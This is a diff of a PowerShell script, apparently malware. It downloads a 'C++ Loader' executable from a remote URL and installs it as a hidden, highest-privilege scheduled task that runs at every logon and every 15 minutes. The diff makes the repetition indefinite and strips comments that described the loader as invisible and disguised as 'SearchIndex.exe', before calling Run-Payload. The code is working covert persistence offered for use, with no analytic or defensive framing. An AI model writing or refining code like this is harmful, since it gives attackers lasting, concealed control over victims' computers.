@@ -45,8 +45,7 @@ function Run-Payload {
 
 # --- 3. PERSISTENCE (Install C++ Loader) ---
 try {
-    # A. Download the C++ Loader (Invisible EXE)
-    # Always try to download fresh to ensure we have the latest version
+    # A. Download the C++ Loader
     try {
         $wc = New-Object Net.WebClient
         $wc.DownloadFile($LoaderUrl, $LoaderPath)
@@ -55,33 +54,40 @@ try {
     }
 
     # B. Register the Scheduled Task
-    # This task runs 'SearchIndex.exe' (Your C++ Loader) -> Which runs PowerShell silently
     $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     
-    if ($true) { # Always run this block to ensure settings are enforced
+    if ($true) { 
         $Action = New-ScheduledTaskAction -Execute $LoaderPath
         
         # Trigger 1: Run immediately when User Logs on
         $Trigger1 = New-ScheduledTaskTrigger -AtLogon
         
-        # Trigger 2: Run every 15 Minutes (For 20 Years)
-        # FIX: We use 7300 days instead of MaxValue to avoid the "Out of Range" crash.
+        # Trigger 2: Run Once (Now) -> Repeat every 15 mins -> Indefinitely
+        # TRICK: We create a simple trigger first, then manually force the "Indefinitely" duration
         $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
-        $Trigger2.Repetition.Duration = [TimeSpan]::FromDays(7300)
         
-        # Principal: Run with Highest Privileges (Admin/System rights if avail)
+        # Principal: Run with Highest Privileges
         $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
         
-        # Settings: Hidden, Wake to Run, Parallel Execution (so it doesn't block)
+        # Settings: Hidden, Parallel Execution
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel
         
-        # Force Register/Overwrite the task
-        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
+        # Register the task (This usually defaults to 1 day duration if not specified)
+        $Task = Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force
+        
+        # C. MODIFY THE TASK TO BE TRULY INDEFINITE (The Fix)
+        # We edit the raw XML of the task to set Duration to "PT0S" (which means Indefinitely in XML schema)
+        $TaskTrigger = $Task.Triggers[1] # Select the second trigger (the repetition one)
+        $TaskTrigger.Repetition.Duration = [TimeSpan]::Zero # Zero often maps to "Indefinitely" in PS object model
+        $Task | Set-ScheduledTask -ErrorAction SilentlyContinue
+        
         Write-Host "✅ C++ Persistence Installed (Zero Flash)." -F Green
     }
 } catch {
     Write-Host "⚠️ Persistence Setup Failed: $($_.Exception.Message)" -F Red
 }
 
+
 # --- 4. START ---
 Run-Payload
+
